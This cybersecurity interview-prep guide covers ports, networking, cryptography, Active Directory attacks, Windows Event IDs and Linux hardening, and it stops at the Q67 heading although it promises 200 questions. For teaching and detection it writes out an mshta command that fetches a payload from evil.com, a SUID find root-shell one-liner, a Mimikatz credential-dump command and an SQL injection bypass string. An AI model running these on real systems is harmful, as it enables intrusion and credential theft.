# Cybersecurity Interview Preparation Guide — Complete Edition
### 200 Questions | Rebuilt & Extended
*Covering SOC Analyst, Blue Team, Security Engineer, and Penetration Tester roles*
*Includes: Technical Knowledge · Windows Event IDs · Ports & Protocols · Scenario Questions · Behavioral Questions*

---

## HOW TO USE THIS GUIDE

This guide is organized into **role awareness tracks**. Before studying, know which role you are targeting:

- 🔵 **Blue Team / SOC Analyst** — Focus on sections 1, 2, 4, 5, 6, 8, 10, 11, 12, 14, 15, 16
- 🔴 **Red Team / Penetration Tester** — Focus on sections 1, 2, 3, 5, 7, 9, 13, 14, 15
- 🟣 **Security Engineer / General** — Study all sections

Questions marked with **[CRITICAL]** come up in almost every interview at every level. Never skip these.

---

## TABLE OF CONTENTS

1. [Ports & Protocols](#1-ports--protocols)
2. [Networking Fundamentals](#2-networking-fundamentals)
3. [Cryptography](#3-cryptography)
4. [Active Directory & Windows Security](#4-active-directory--windows-security)
5. [Windows Event IDs & Log Analysis](#5-windows-event-ids--log-analysis)
6. [Linux Security](#6-linux-security)
7. [Attack Techniques & Exploitation](#7-attack-techniques--exploitation)
8. [Defense, Detection & Monitoring](#8-defense-detection--monitoring)
9. [Web Application Security](#9-web-application-security)
10. [Malware & Modern Threats](#10-malware--modern-threats)
11. [Cloud Security](#11-cloud-security)
12. [Incident Response & Forensics](#12-incident-response--forensics)
13. [Security Frameworks & Governance](#13-security-frameworks--governance)
14. [Identity, Access & Authentication](#14-identity-access--authentication)
15. [Practical Tools & Applied Knowledge](#15-practical-tools--applied-knowledge)
16. [Scenario-Based Questions](#16-scenario-based-questions)
17. [Behavioral & Situational Questions](#17-behavioral--situational-questions)

---

## 1. PORTS & PROTOCOLS

> **Why this matters:** Port and protocol questions appear in nearly every entry-level and mid-level interview. Interviewers embed them in scenario questions too — "you see unexpected traffic on port X, what do you think?"

---

**Q1. [CRITICAL] What are the most important ports every security professional must know?**

| Port | Protocol | Notes |
|------|----------|-------|
| 20/21 | FTP | File transfer — unencrypted, avoid in production |
| 22 | SSH | Secure remote shell — encrypted replacement for Telnet |
| 23 | Telnet | Remote shell — plaintext, never use |
| 25 | SMTP | Email sending — often abused for spam/phishing |
| 53 | DNS | Name resolution — UDP for queries, TCP for zone transfers |
| 67/68 | DHCP | IP address assignment |
| 80 | HTTP | Unencrypted web — should be redirected to 443 |
| 110 | POP3 | Email retrieval — plaintext |
| 119 | NNTP | News protocol |
| 123 | NTP | Time synchronization — critical for Kerberos (5-minute tolerance) |
| 135 | RPC/DCOM | Windows RPC — abused in many exploits |
| 137-139 | NetBIOS | Legacy Windows name resolution — disable if possible |
| 143 | IMAP | Email retrieval — encrypted version on 993 |
| 161/162 | SNMP | Network device management — v1/v2 are insecure |
| 389 | LDAP | Directory queries — plaintext |
| 443 | HTTPS | Encrypted web |
| 445 | SMB | Windows file sharing — EternalBlue, WannaCry, Relay attacks |
| 465/587 | SMTPS | Encrypted email submission |
| 500 | IKE | IPsec key exchange |
| 636 | LDAPS | LDAP over TLS |
| 993 | IMAPS | Encrypted IMAP |
| 995 | POP3S | Encrypted POP3 |
| 1433 | MSSQL | Microsoft SQL Server |
| 1521 | Oracle DB | Oracle database |
| 3306 | MySQL | MySQL database |
| 3389 | RDP | Remote Desktop — high-value attack target |
| 4444 | Metasploit | Default Meterpreter listener — suspicious if seen |
| 5985/5986 | WinRM | Windows Remote Management (HTTP/HTTPS) |
| 8080 | HTTP Alt | Alternative web port, often dev/proxy |
| 8443 | HTTPS Alt | Alternative HTTPS |

> **Interview trap:** Interviewers often ask "why is seeing traffic on port 4444 suspicious?" Answer: it's the default Metasploit reverse shell listener. Seeing it on your network almost always means compromise or an active pentest.

---

**Q2. [CRITICAL] Why is Telnet dangerous compared to SSH?**

Telnet transmits everything — including credentials and commands — in **plaintext** across the network. Anyone with access to the traffic (via MITM, packet capture) can read the session. SSH encrypts the entire session with modern cryptography.

> **Example:** A packet capture of a Telnet session shows the administrator's password in clear text. The same capture of an SSH session shows only encrypted gibberish.

---

**Q3. Why is port 445 (SMB) considered high-risk?**

SMB (Server Message Block) is Windows' file and printer sharing protocol. It has been the vector for some of the most damaging attacks in history: EternalBlue (exploited by WannaCry/NotPetya), NTLM Relay attacks, and lateral movement.

> **Best practice:** Block SMB at the perimeter. Disable SMBv1 entirely. Enable SMB Signing.

---

**Q4. Why does DNS use both UDP and TCP, and when does it switch?**

- **UDP port 53** — Standard queries (fast, low overhead). Used for the vast majority of DNS lookups.
- **TCP port 53** — Used when the response exceeds 512 bytes, and for **zone transfers** (AXFR). Zone transfers replicate the entire DNS zone — if not restricted, an attacker can enumerate all hostnames in a domain.

> **Security concern:** If you see large volumes of TCP/53 traffic to an external server, or DNS TXT queries with unusually long subdomains — suspect DNS tunneling.

---

**Q5. Why does NTP (port 123) matter in security?**

Kerberos authentication has a **5-minute clock skew tolerance**. If clocks are out of sync beyond 5 minutes, Kerberos tickets are rejected and authentication fails. Attackers who can manipulate NTP can potentially cause widespread authentication failures (denial of service).

> **Security note:** NTP also has its own attack — NTP amplification DDoS, where small queries return large responses.

---

**Q6. What is the security concern with SNMP v1 and v2?**

SNMP (Simple Network Management Protocol) manages and monitors network devices. v1 and v2 use a "community string" (effectively a plaintext password) for authentication. If the default community string `public` (read) or `private` (write) is left unchanged, an attacker can read network device configurations or modify them.

> **Fix:** Use SNMPv3, which supports proper authentication and encryption.

---

**Q7. What ports are associated with common attack tools, and what does seeing them imply?**

| Port | Tool/Service | Implication if unexpected |
|------|-------------|--------------------------|
| 4444 | Metasploit Meterpreter | Active compromise or pentest |
| 1234 | Netcat listener | Backdoor or pentest |
| 31337 | Back Orifice | Legacy RAT — historical significance |
| 6667 | IRC | Historically used for C2 botnets |
| 9001/9030 | Tor | Possible anonymized C2 or data exfil |

---

## 2. NETWORKING FUNDAMENTALS

---

**Q8. [CRITICAL] What is the OSI model and why does it matter in security?**

7-layer framework: Physical → Data Link → Network → Transport → Session → Presentation → Application. Security professionals use it to identify *where* an attack operates and what control addresses it.

| Layer | Name | Attack Examples | Controls |
|-------|------|----------------|----------|
| 1 | Physical | Physical access, wiretapping | Locked rooms, cable shielding |
| 2 | Data Link | ARP Spoofing, MAC Flooding | DAI, Port Security, 802.1X |
| 3 | Network | IP Spoofing, routing attacks | Firewalls, ACLs |
| 4 | Transport | SYN Flood, port scanning | Stateful firewalls, rate limiting |
| 5-6 | Session/Presentation | Session hijacking, SSL stripping | TLS, session tokens |
| 7 | Application | SQLi, XSS, phishing | WAF, input validation |

---

**Q9. [CRITICAL] What is the Three-Way Handshake and how is it exploited?**

TCP connection establishment:
1. **SYN** — Client: "I want to connect, my seq is X"
2. **SYN-ACK** — Server: "OK, my seq is Y, your seq+1 is X+1"
3. **ACK** — Client: "Confirmed" — connection established

**Exploitation — SYN Flood:** Attacker sends thousands of SYN packets with spoofed source IPs. Server allocates resources for each half-open connection and sends SYN-ACKs that are never completed. Server's connection table fills up, denying service to legitimate clients.

> **Defence:** SYN cookies — server doesn't allocate resources until the full handshake completes.

---

**Q10. [CRITICAL] What is ARP and how does ARP Spoofing work?**

ARP (Layer 2) resolves IP → MAC address. A device broadcasts "Who has 192.168.1.1?" — the owner replies with its MAC, which is cached in the ARP table.

**ARP Spoofing:** Attacker sends unsolicited (Gratuitous) ARP replies: "192.168.1.1 is at MY MAC." Victim and router both update their ARP caches. All traffic now flows through the attacker — classic MITM.

> **Defence:** Dynamic ARP Inspection (DAI) on managed switches validates ARP packets against the DHCP snooping binding table.

---

**Q11. [CRITICAL] How does DNS resolution work step by step?**

For `www.example.com`:
1. Check browser cache
2. Check OS hosts file (`C:\Windows\System32\drivers\etc\hosts` or `/etc/hosts`)
3. Query local resolver (router/ISP)
4. Resolver queries Root DNS → returns `.com` TLD server address
5. TLD server returns authoritative nameserver for `example.com`
6. Authoritative server returns IP address
7. IP cached (per TTL), connection established

> **Attack surface:** Any step can be poisoned — hosts file modification (malware), DNS cache poisoning, rogue DNS servers, BGP hijacking.

---

**Q12. What is the difference between IDS and IPS?**

- **IDS (Intrusion Detection System)** — Passive, out-of-band. Monitors a copy of traffic, alerts on suspicious activity. No blocking capability.
- **IPS (Intrusion Prevention System)** — Active, inline. Traffic passes through it. Detects and automatically blocks threats.

> **Trade-off:** IPS can cause outages if it produces false positives. IDS causes alert fatigue but never breaks legitimate traffic. Many environments use both.

---

**Q13. What is a stateful vs stateless firewall?**

- **Stateless** — Evaluates each packet in isolation using ACL rules (source IP, dest IP, port). Cannot distinguish a legitimate reply from an unsolicited probe.
- **Stateful** — Tracks TCP session state. Knows what traffic is expected. Blocks unsolicited inbound packets, even on allowed ports.

> **Example:** Stateless: allows all inbound port 80. Stateful: only allows inbound port 80 responses to outbound requests it has seen.

---

**Q14. What is NAT and what are the three types?**

NAT translates private IPs to public IPs:
- **Static NAT** — 1:1 mapping. Used for servers needing a fixed public IP.
- **Dynamic NAT** — Draws from a pool. Not fixed.
- **PAT (Port Address Translation)** — Many private IPs share one public IP via unique port numbers. Used in home routers.

---

**Q15. What is a VLAN and what is a VLAN Hopping attack?**

VLANs logically segment a physical network. Devices in different VLANs cannot communicate without a router/Layer 3 switch.

**VLAN Hopping (Double Tagging):** Attacker sends a frame with two 802.1Q tags. The first switch strips the outer tag; the inner tag delivers the frame to a different VLAN. Only works toward the attacker's direction.

> **Defence:** Never use VLAN 1 as native VLAN. Explicitly set all trunk ports. Disable unused ports and assign them to an unused VLAN.

---

**Q16. What is a DMZ and how is it architected?**

A network zone hosting public-facing services isolated from the internal network.

```
Internet → [Firewall 1] → DMZ (Web/Mail/DNS servers) → [Firewall 2] → Internal Network
```

If the web server in the DMZ is compromised, Firewall 2 prevents the attacker from reaching internal systems.

---

**Q17. What is the difference between bandwidth and throughput?**

- **Bandwidth** — Theoretical maximum capacity (e.g., 1 Gbps).
- **Throughput** — Actual data transferred under real conditions. Always ≤ bandwidth.

> Throughput is reduced by latency, packet loss, congestion, and protocol overhead.

---

**Q18. What is encapsulation and decapsulation?**

As data travels down the OSI stack (sender), each layer adds a header — this is encapsulation. As data travels up the stack (receiver), each layer strips its header — decapsulation.

> HTTP request → TCP header added → IP header added → Ethernet frame added → transmitted → receiver strips in reverse.

---

**Q19. What is a honeypot and a honeynet?**

- **Honeypot** — Decoy system designed to attract and study attackers. Isolated from real systems.
- **Honeynet** — Multiple honeypots forming a fake network, capturing more complex attack behaviour.
- **Low-interaction** — Simulates services (limited attacker engagement).
- **High-interaction** — Full real OS — captures complete attacker TTPs.

---

**Q20. What is the difference between NGFW and WAF?**

- **NGFW (Next-Generation Firewall)** — Network-level, Layers 3–7. Application awareness, IPS, SSL inspection, URL filtering. Protects the entire network.
- **WAF (Web Application Firewall)** — Layer 7 only. Specifically protects web applications from OWASP Top 10 attacks (SQLi, XSS, CSRF, etc.).

> NGFW is the building's perimeter guard. WAF is the specialist protecting the web server room.

---

## 3. CRYPTOGRAPHY

---

**Q21. [CRITICAL] What is the difference between symmetric and asymmetric encryption?**

- **Symmetric** — One key encrypts and decrypts. Fast. Good for bulk data. Problem: how do you securely share the key? (**AES-128, AES-256, 3DES**)
- **Asymmetric** — Public/private key pair. Public key encrypts, private key decrypts. Slower. Solves key distribution. (**RSA, ECC**)

> **In practice (hybrid):** Asymmetric exchanges a symmetric session key securely. Then symmetric encrypts all actual data. This is how TLS works.

---

**Q22. [CRITICAL] What is hashing and how is it different from encryption?**

- **Hashing** — One-way transformation. Cannot be reversed. Same input always produces same output. Used for integrity verification and password storage.
- **Encryption** — Two-way. Can be decrypted with the key. Used for confidentiality.

> **Example:** You never store a password — you store its hash. When the user logs in, you hash their input and compare. You never need to decrypt.

---

**Q23. What is a digital signature and what does it guarantee?**

Process:
1. Sender hashes the message
2. Encrypts hash with their **private key** → this is the signature
3. Recipient decrypts signature with sender's **public key** → gets hash
4. Recipient hashes the received message independently
5. If hashes match → message is authentic and unmodified

Guarantees: **Authentication** (came from sender), **Integrity** (not altered), **Non-Repudiation** (sender can't deny it).

---

**Q24. What is non-repudiation?**

The inability to deny having performed an action. Achieved through digital signatures, audit logs, and timestamps.

> **Example:** An employee digitally signs a policy acceptance. They cannot later claim they didn't agree to it.

---

**Q25. What is salting and why does it prevent rainbow table attacks?**

A salt is a random unique value added to a password before hashing. It ensures identical passwords produce different hashes.

> **Rainbow table attack:** Pre-computed hash→plaintext lookup table. Salting defeats this — a separate table would need to be computed for every possible salt value.
>
> **Pepper:** A secret added at the application level (not stored in the DB) — an extra layer even if the database is stolen.

---

**Q26. What are bcrypt, scrypt, and Argon2 — and why are they preferred for passwords?**

They are intentionally **slow** (computationally expensive) hashing algorithms designed for password storage. Regular hashing algorithms (SHA-256) are fast — good for integrity, bad for passwords because attackers can try billions of guesses per second.

> **Example:** bcrypt on modern hardware: ~100ms per hash. At 100ms/hash, cracking 1 billion passwords takes ~3 years. With SHA-256 at nanoseconds: minutes.

---

**Q27. What is Diffie-Hellman and where is it used?**

A key exchange protocol allowing two parties to derive a shared secret over an insecure channel without transmitting the secret. Based on the discrete logarithm problem.

Used in: **TLS** (ECDHE), **IPsec** (IKE), **SSH**.

> **Perfect Forward Secrecy (PFS):** When Diffie-Hellman generates a new ephemeral key per session, even capturing today's traffic and stealing the server's private key tomorrow cannot decrypt it. Past sessions remain safe.

---

**Q28. What is the difference between MD5, SHA-1, SHA-256, and SHA-3?**

| Algorithm | Output | Status |
|-----------|--------|--------|
| MD5 | 128-bit | Broken — collision attacks proven |
| SHA-1 | 160-bit | Deprecated — Google demonstrated collision (SHAttered) |
| SHA-256 | 256-bit | Current standard — widely used |
| SHA-3 | Variable | Modern alternative, different internal design |

> **Interview rule:** Never recommend MD5 or SHA-1 for any security purpose. SHA-256 minimum. Argon2/bcrypt for passwords.

---

**Q29. What is PKI?**

Public Key Infrastructure — the system of policies, procedures, hardware, and software for managing digital certificates and public/private key pairs.

Components: **Certificate Authority (CA)**, **Registration Authority (RA)**, **X.509 certificates**, **Certificate Revocation List (CRL)**, **OCSP**.

> **Example:** When Chrome shows a padlock on `https://bank.com`, it has verified the bank's certificate was signed by a trusted CA — confirming you're talking to the real bank, not an impersonator.

---

**Q30. What is a hash collision and why does it matter?**

Two different inputs that produce the same hash output. This undermines integrity — an attacker could substitute one file for another and they'd have the same hash.

> MD5 was broken when researchers demonstrated a collision in 2004. SHA-1 in 2017. Both are now retired from security use.

---

## 4. ACTIVE DIRECTORY & WINDOWS SECURITY

---

**Q31. [CRITICAL] Explain the Active Directory structure.**

```
Forest (top-level security boundary)
  └── Domain (e.g., company.com)
        └── Organizational Unit (OU) (e.g., IT, Finance)
              └── Objects (Users, Computers, Groups, Printers)
Domain Controller (DC) — runs AD, holds NTDS.dit database
```

---

**Q32. [CRITICAL] What is the difference between an OU and a Group?**

- **OU** — Administrative container. Apply **GPOs** to it. Represents your org chart.
- **Group** — Assigns **resource permissions** (file shares, applications). Not a container.

> **Rule:** You manage WITH OUs. You grant access WITH Groups.

---

**Q33. How does Kerberos authentication work?**

1. User logs in → sends encrypted timestamp to **KDC**
2. KDC verifies → issues **TGT** (Ticket Granting Ticket) — encrypted with KRBTGT hash
3. User presents TGT → requests **Service Ticket** for a specific service
4. Service Ticket issued — encrypted with service account's hash
5. User presents Service Ticket to service → access granted

> **Analogy:** TGT = theme park wristband. Service Ticket = individual ride token. You don't re-prove payment every ride.

---

**Q34. What is a Golden Ticket attack?**

Attacker compromises the **KRBTGT account hash** (by dumping NTDS.dit or via DCSync). They forge a TGT for any user with any privileges — valid for 10 years by default.

> **Impact:** Complete domain compromise. Even changing passwords doesn't help — only rotating KRBTGT **twice** invalidates all Golden Tickets.

---

**Q35. What is a Silver Ticket attack?**

Using a **service account's hash**, attacker forges a Service Ticket for that specific service only. No KDC contact needed — harder to detect.

> **Example:** Compromise `MSSQLSvc` hash → forge ticket for SQL server only → no KDC logs generated.

---

**Q36. What is Kerberoasting?**

Any domain user can request a Service Ticket for services with SPNs. These tickets are encrypted with the service account's password hash. Attacker requests tickets → cracks offline with Hashcat.

> **Defence:** Use gMSA (Group Managed Service Accounts) — auto-generated 120-character passwords that are practically uncrackable.

---

**Q37. What is ASREPRoasting?**

Targets accounts with **Kerberos pre-authentication disabled**. Without pre-auth, KDC returns an AS-REP encrypted with the user's password hash — no identity verification required. Attacker cracks offline.

> **Defence:** Always enable pre-authentication. Regularly audit AD for accounts with it disabled.

---

**Q38. What is Pass-the-Hash?**

Using a captured **NTLM hash** directly to authenticate — no need to crack the plaintext password. The hash IS the credential in NTLM.

> **Tool:** Mimikatz, CrackMapExec. **Defence:** Credential Guard, disabling NTLM where possible, tiered administration model.

---

**Q39. What is NTLM and what are its weaknesses?**

NTLM uses Challenge-Response:
1. Client requests connection
2. Server sends random **nonce (challenge)**
3. Client encrypts challenge with NTLM hash → sends response
4. Server (or DC) verifies

**Weaknesses:** Response can be captured and cracked (Net-NTLMv2) or relayed to another server (NTLM Relay). No mutual authentication — server identity not verified.

---

**Q40. What is NTLM Relay / SMB Relay?**

Attacker intercepts a victim's NTLM authentication and **replays it to another server**, authenticating as the victim — no hash cracking needed.

> **Tool chain:** Responder (captures) + ntlmrelayx (relays)
> **Defence:** **Enable SMB Signing** — cryptographically ties authentication to the specific connection. Relay becomes impossible.

---

**Q41. What is LSASS and why is it a target?**

LSASS (Local Security Authority Subsystem Service) manages all Windows authentication. It holds credential material in memory: NTLM hashes, Kerberos tickets, sometimes plaintext passwords (older systems).

> **Mimikatz command:** `sekurlsa::logonpasswords`
> **Defence:** Windows Credential Guard (virtualises LSASS memory), restrict SeDebugPrivilege, EDR monitoring of LSASS access.

---

**Q42. What is DCSync?**

Mimics a Domain Controller's replication request to pull all password hashes from AD without touching the DC's disk. Requires **Replicating Directory Changes All** privilege (Domain Admin level).

> **Detection:** Monitor for Replication requests (Event ID 4662) from non-DC accounts.

---

**Q43. What is the SAM database vs NTDS.dit?**

- **SAM** (`C:\Windows\System32\config\SAM`) — Stores **local** account hashes. Cannot be read while Windows runs (Volume Shadow Copy or offline methods needed).
- **NTDS.dit** — The Active Directory database on Domain Controllers. Stores **all domain account hashes**. Primary target for domain-wide credential theft.

---

**Q44. What is LLMNR/NetBIOS poisoning?**

LLMNR and NetBIOS resolve names when DNS fails by broadcasting queries to the whole subnet. Any host can respond — Responder tool answers these queries, captures Net-NTLMv2 hashes.

> **Example:** User types `\\fileservre` (typo). PC broadcasts LLMNR query. Responder answers "I'm fileservre." Captures the authentication hash.
> **Defence:** Disable LLMNR and NetBIOS via GPO.

---

**Q45. What is UAC and how can it be bypassed?**

UAC (User Account Control) prompts for elevation when admin privileges are requested, even for admin users who normally run with standard tokens.

**Bypass techniques:** fodhelper, eventvwr, sdclt — these are Windows built-in programs that auto-elevate and can be hijacked to run arbitrary commands without a UAC prompt.

---

**Q46. What is DLL Hijacking?**

Windows searches for DLLs in a predictable order (application directory first, then system directories). Placing a malicious DLL where it's found first causes the application to load it with the application's privileges.

> **Common scenario:** Application running as SYSTEM looks for `version.dll` in its own directory first. Attacker writes malicious `version.dll` there. System-level code execution.

---

## 5. WINDOWS EVENT IDS & LOG ANALYSIS

> **Why this section is critical:** This is the #1 tested area for SOC Analyst and Blue Team interviews. Interviewers will show you Event IDs and ask what happened, or describe a scenario and ask what Event IDs you'd look for.

---

**Q47. [CRITICAL] What are the most important Windows Event IDs every security analyst must know?**

**Authentication Events:**

| Event ID | Description | Why It Matters |
|----------|-------------|---------------|
| **4624** | Successful logon | Baseline — check logon type |
| **4625** | Failed logon | Brute force indicator |
| **4634/4647** | Logoff | Session duration analysis |
| **4648** | Logon with explicit credentials | Lateral movement indicator (RunAs, PtH) |
| **4672** | Special privileges assigned at logon | Admin login — high-value |
| **4768** | Kerberos TGT requested | Kerberos authentication start |
| **4769** | Kerberos Service Ticket requested | Kerberoasting generates many of these |
| **4771** | Kerberos pre-auth failed | Failed Kerberos login |
| **4776** | NTLM authentication attempt | NTLM used instead of Kerberos |

**Account Management:**

| Event ID | Description | Why It Matters |
|----------|-------------|---------------|
| **4720** | User account created | New account — could be persistence |
| **4722** | User account enabled | Disabled account re-enabled |
| **4723/4724** | Password change/reset | Credential change |
| **4728/4732/4756** | Member added to security group | Privilege escalation |
| **4738** | User account changed | Account modification |
| **4740** | Account locked out | Brute force indicator |

**System & Process Events:**

| Event ID | Description | Why It Matters |
|----------|-------------|---------------|
| **4688** | New process created | LOLBin abuse, malicious child processes |
| **4697** | Service installed | Persistence mechanism |
| **4698** | Scheduled task created | Persistence mechanism |
| **4702** | Scheduled task updated | Persistence modification |
| **4719** | System audit policy changed | Attacker disabling logging |
| **4946/4947/4950** | Firewall rule added/changed | Attacker opening ports |

**Critical Security Events:**

| Event ID | Description | Why It Matters |
|----------|-------------|---------------|
| **1102** | Security audit log cleared | **IMMEDIATE ALERT** — attacker covering tracks |
| **4616** | System time changed | Kerberos bypass attempt |
| **4657** | Registry value modified | Persistence via registry |
| **4663** | Access to object attempted | File/folder access |
| **4662** | Directory service object accessed | DCSync detection |
| **7045** | New service installed (System log) | Malware persistence |

---

**Q48. [CRITICAL] What are the Logon Types in Event ID 4624 and why do they matter?**

| Type | Name | Description | Security Relevance |
|------|------|-------------|-------------------|
| **2** | Interactive | Physical keyboard login | Normal |
| **3** | Network | Access to shared folder/resource | Check source — lateral movement |
| **4** | Batch | Scheduled task | Check task legitimacy |
| **5** | Service | Service account login | Monitor for unusual service accounts |
| **7** | Unlock | Workstation unlock | Normal |
| **8** | NetworkCleartext | Credentials sent in plaintext | **Problem** — legacy auth |
| **9** | NewCredentials | RunAs with /netonly | Used in Pass-the-Hash |
| **10** | RemoteInteractive | RDP login | High-value — monitor closely |
| **11** | CachedInteractive | Cached credentials login | Offline/domain unavailable |

> **Interview scenario:** You see Event ID 4624 Logon Type 3 from a workstation account to a server at 3am. What do you think? Answer: Lateral movement — workstations normally don't authenticate to servers at 3am. Investigate that workstation.

---

**Q49. [CRITICAL] You see Event ID 1102 in the Security log. What does this mean and what do you do?**

Event ID 1102 means the **Security Audit Log was cleared**. This is a critical indicator — it almost always means an attacker is covering their tracks.

**Immediate actions:**
1. Do NOT touch the affected system further
2. Isolate the system from the network
3. Check your SIEM for logs forwarded before the clear
4. Identify who cleared the log (the event includes the user account)
5. Begin Incident Response

> **Why it matters:** Smart attackers clear logs as one of their final steps before leaving or establishing persistent access. If you see this, assume compromise.

---

**Q50. You're investigating a potential compromise. What Event IDs would you look for first?**

**Step 1 — Was the log cleared?** Look for 1102.

**Step 2 — Authentication activity:** 4624 (logins), 4625 (failed logins — pattern of many = brute force), 4648 (explicit credential use).

**Step 3 — Privilege escalation:** 4672 (special privileges), 4728/4732/4756 (added to privileged groups).

**Step 4 — Persistence:** 4698 (scheduled task), 4697 (service installed), 7045 (service installed — System log).

**Step 5 — Process execution:** 4688 (process creation) — look for suspicious parent-child relationships.

> **Classic red flag chain:** 4624 (login) → 4672 (special privileges) → 4688 (cmd.exe spawned) → 4688 (powershell.exe spawned by cmd.exe) → 4698 (scheduled task created).

---

**Q51. What Event ID indicates Kerberoasting is occurring?**

**Event ID 4769** — Kerberos Service Ticket (TGS) Requested.

**What to look for:** Many 4769 events from a single user account requesting tickets for multiple different services in a short timeframe. Encryption type `0x17` (RC4-HMAC) in 4769 is suspicious — modern environments should use AES, and Kerberoasting tools request RC4 for easier cracking.

---

**Q52. How would you detect a Pass-the-Hash attack using Event IDs?**

Look for **Event ID 4624 with Logon Type 3** combined with:
- Authentication Package: **NTLM** (not Kerberos)
- Source workstation that doesn't match the typical login pattern
- Account authenticating to multiple systems rapidly
- **Event ID 4648** — logon with explicit credentials

> **Key indicator:** In a modern AD environment, Kerberos should be used for most authentication. Unexpected NTLM (4776) across multiple systems from one account = suspicious.

---

**Q53. What does Event ID 4688 tell you and how is it used for threat detection?**

Event ID 4688 logs new process creation. When process command-line auditing is enabled, it captures the full command line — critical for detecting:

- **LOLBin abuse:** `certutil.exe -decode`, `mshta.exe http://evil.com/payload`
- **Malicious PowerShell:** Long base64-encoded commands in PowerShell
- **Suspicious parent-child relationships:** Word.exe spawning powershell.exe (macro malware)
- **Reconnaissance:** `net user /domain`, `whoami /groups`, `ipconfig /all` run by non-admin

> **Enable:** Computer Configuration → Windows Settings → Security Settings → Advanced Audit Policy Configuration → Detailed Tracking → Process Creation. Also enable command-line logging via GPO.

---

## 6. LINUX SECURITY

---

**Q54. [CRITICAL] Explain the Linux filesystem hierarchy.**

| Directory | Purpose |
|-----------|---------|
| `/` | Root — everything starts here |
| `/etc` | Configuration files |
| `/var/log` | Log files |
| `/home` | User home directories |
| `/root` | Root user's home |
| `/bin` | Essential commands (all users) |
| `/sbin` | System commands (root only) |
| `/usr/bin` | User programs |
| `/tmp` | Temp files — world-writable, sticky bit set |
| `/proc` | Virtual FS — kernel/process runtime data |
| `/dev` | Device files |
| `/mnt`, `/media` | Mount points |

---

**Q55. [CRITICAL] How do Linux file permissions work?**

Format: `[type][owner rwx][group rwx][others rwx]`

Example: `-rwxr-xr--`
- `-` = regular file
- `rwx` = owner can read, write, execute
- `r-x` = group can read, execute
- `r--` = others can only read

**Numeric:** r=4, w=2, x=1. `chmod 755` = 7(rwx) 5(r-x) 5(r-x)

`chown user:group file` — changes ownership
`chmod permissions file` — changes permissions

---

**Q56. What is the SUID bit and why is it dangerous?**

SUID causes a program to execute with the **file owner's privileges** (often root), regardless of who runs it.

**Legitimate use:** `/usr/bin/passwd` needs root to write `/etc/shadow`.

**Security risk:** If `find`, `python`, `bash`, or `vim` have SUID root, any user can get a root shell.

> **Check:** `find / -perm -4000 -type f 2>/dev/null`
> **Example exploit:** `find . -exec /bin/bash -p \;` — if find has SUID root, this drops you into a root shell.

---

**Q57. What is the sticky bit and where is it used?**

When set on a directory, only the file owner (or root) can delete their own files — even if others have write access to the directory.

> **Default:** `/tmp` has sticky bit (`drwxrwxrwt` — the `t` indicates sticky bit). Without it, anyone could delete anyone's temp files.

---

**Q58. What is /etc/passwd vs /etc/shadow?**

- `/etc/passwd` — World-readable. Contains username, UID, GID, home dir, shell. Password field shows `x`.
- `/etc/shadow` — Root-readable only. Contains password hashes, expiry dates.

> **Why separated:** If hashes were in world-readable `/etc/passwd`, every local user could attempt to crack them offline.

---

**Q59. What is sudoers and how do you harden it?**

`/etc/sudoers` defines who can run what with sudo. Always edit with `visudo` (validates syntax before saving).

**Hardening:**
- Use specific command paths: `john ALL=(ALL) /usr/bin/apt` (not `ALL`)
- Enable sudo logging: `Defaults logfile=/var/log/sudo.log`
- Require password: never set `NOPASSWD` unless absolutely necessary
- Audit regularly: `sudo -l -U username`

---

**Q60. What are the most important Linux log files for security?**

| File | Contents |
|------|---------|
| `/var/log/auth.log` | SSH logins, sudo, su, PAM authentication |
| `/var/log/syslog` | General system events |
| `/var/log/kern.log` | Kernel messages |
| `/var/log/apache2/access.log` | Web server requests |
| `/var/log/apache2/error.log` | Web server errors |
| `/var/log/fail2ban.log` | Blocked IPs (if fail2ban installed) |
| `/var/log/audit/audit.log` | Auditd — detailed security events |

> **For systemd systems:** `journalctl -u ssh` (SSH logs), `journalctl -p err` (error level and above).

---

**Q61. What is AppArmor and how does it work?**

Linux Mandatory Access Control (MAC) system. Each application gets a profile restricting what files, capabilities, and network access it may use. Even a compromised application cannot exceed its profile.

> **Example:** AppArmor profile for nginx allows reading `/var/www/html` but denies access to `/etc/shadow`. Nginx compromise doesn't expose password hashes.

---

**Q62. What is the difference between a local variable and an environment variable in Linux?**

- **Local:** `x=5` — exists only in current shell session. Child processes cannot see it.
- **Environment:** `export x=5` — inherited by all child processes.

> Common environment variables: `$PATH`, `$HOME`, `$USER`, `$SHELL`
> `env` — lists all environment variables. Security concern: credentials or secrets accidentally placed in environment variables.

---

## 7. ATTACK TECHNIQUES & EXPLOITATION

---

**Q63. [CRITICAL] What is the Cyber Kill Chain?**

Lockheed Martin's 7-stage attack model:

| Stage | Description | Defender Response |
|-------|-------------|------------------|
| Reconnaissance | Research target | Limit public exposure (OSINT reduction) |
| Weaponisation | Build payload/exploit | Threat intel on new exploits |
| Delivery | Send payload (phishing, USB) | Email filtering, user training |
| Exploitation | Trigger vulnerability | Patch management, EDR |
| Installation | Establish persistence | EDR, application control |
| C2 | Remote control channel | DNS/proxy filtering, network monitoring |
| Actions on Objectives | Exfil, ransomware, destruction | DLP, segmentation, backups |

> **Key point:** Defenders win by breaking the chain at **any** stage. You don't need to catch everything — stop it somewhere.

---

**Q64. [CRITICAL] What is MITRE ATT&CK and how is it used?**

A publicly maintained knowledge base of real-world adversary tactics, techniques, and procedures (TTPs) organized by attack phase.

**Practical uses:**
- **Threat Hunting:** "APT29 uses T1059.001 (PowerShell execution). Do we have detections for that?"
- **Detection Engineering:** Writing SIEM rules mapped to ATT&CK techniques
- **Gap Analysis:** "Which ATT&CK techniques do we have no coverage for?"
- **Red Team Planning:** Build attack simulations based on relevant threat actors

---

**Q65. What is the difference between passive and active reconnaissance?**

- **Passive:** No direct contact — OSINT, WHOIS, Shodan, LinkedIn, DNS lookups, job postings, GitHub. No traces on target.
- **Active:** Direct interaction — port scanning, banner grabbing, ping sweeps. Leaves network traces, detectable.

> **Legal note:** Active recon without written permission is illegal. Passive recon on public information is generally legal.

---

**Q66. What is SQL Injection and how do you prevent it?**

User-supplied input is embedded directly into a SQL query without sanitisation, allowing the attacker to modify the query's logic.

> **Example:**
> Input: `' OR 1=1 --`
> Query becomes: `SELECT * FROM users WHERE user='' OR 1=1 --' AND pass='...'`
> Result: Returns ALL users — authentication bypassed.
>
> **Types:** Classic, Blind (Boolean/Time-based), Out-of-band
> **Prevention:** **Parameterised queries (prepared statements)** — the only reliable fix. Input validation and WAF are supporting controls.

---

**Q67. What is Cross-Site Scripting (XSS)?**

